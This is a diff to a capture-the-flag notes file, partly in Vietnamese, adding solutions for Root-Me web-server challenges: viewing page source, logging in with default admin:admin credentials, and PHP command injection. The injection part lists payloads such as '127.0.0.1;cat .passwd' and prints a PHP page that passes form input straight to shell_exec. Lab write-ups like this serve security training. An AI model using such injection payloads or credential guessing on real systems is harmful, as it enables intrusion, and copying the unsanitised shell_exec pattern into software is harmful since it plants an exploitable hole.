@@ -189,6 +189,43 @@ Browser hiểu nội dung đó như một phần HTML/JavaScript, không phải 
     - Run curl -v -X OPTIONS http://challenge01.root-me.org/web-serveur/ch8/ 
     - Copy the flag from the response
 
+## [HTML - Source code](https://www.root-me.org/en/Challenges/Web-Server/HTML-Source-code)
+
+### Steps to reproduce
+
+    - curl http://challenge01.root-me.org/web-serveur/ch1/index.php
+    - Copy the flag from the response
+
+## [Weak password](https://www.root-me.org/en/Challenges/Web-Server/Weak-password)
+
+### Steps to reproduce
+
+    - curl http://challenge01.root-me.org/web-serveur/ch3/ --> 401 Authorization Required
+    - curl -u admin:admin http://challenge01.root-me.org/web-serveur/ch3/ --> 200 Well done, you can use this password to validate the challenge
+
+## [PHP - Command injection](https://www.root-me.org/en/Challenges/Web-Server/PHP-Command-injection)
+
+### Steps to reproduce
+
+    - C1
+    - via http://challenge01.root-me.org/web-serveur/ch54/index.php --> form nhập ex: 127.0.0.1 thử thì có tác tác dụng là ping tới 1 địa chỉ ip.
+    - Test thử ;whoami --> done có thể khai thác commad.
+    - 127.0.0.1;ls -la
+    - phát hiện file .passwd
+    - 127.0.0.1;cat .passwd --> done
+    - C2
+    - payload : 127.0.0.1;cat index.php
+```
+    <?php 
+$flag = "".file_get_contents(".passwd")."";
+if(isset($_POST["ip"]) && !empty($_POST["ip"])){
+        $response = shell_exec("timeout -k 5 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
+        echo $response;
+}
+?>
+```
+    - Và đọc .passwd để lấy flag
+    
 # 2.  Web application vulnerabilities
 
 ## [My Blog](https://ctflearn.com/challenge/979)
